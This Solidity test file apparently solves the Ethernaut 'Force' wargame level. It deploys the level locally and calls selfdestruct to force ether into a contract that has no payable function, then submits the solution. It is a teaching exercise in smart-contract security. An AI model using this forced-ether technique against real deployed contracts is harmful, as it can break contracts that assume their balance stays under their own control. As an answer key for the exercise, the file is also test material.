// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Force/Force.sol";
import "../Force/ForceFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";

contract ForceTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contracts
        ethernaut = new Ethernaut();
    }

    function testForceAttack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        ForceFactory forceFactory = new ForceFactory();
        ethernaut.registerLevel(forceFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(forceFactory);
        Force force = Force(levelAddress);

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        selfdestruct(payable(address(force)));
        
        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}